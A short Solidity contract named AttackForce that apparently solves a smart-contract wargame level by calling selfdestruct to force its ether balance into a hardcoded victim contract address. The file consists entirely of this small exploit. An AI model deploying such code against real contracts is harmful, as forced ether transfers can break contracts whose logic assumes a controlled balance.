pragma solidity ^0.8.0;

contract AttackForce {

    constructor() payable {
    }

    // CHANGE ADDRESS OF VICTIM CONTRACT
    function attack() public {
        selfdestruct(payable(0x6486Ce696F9B7514A7119Ef8d68088e3eef2b0CD));
    }
}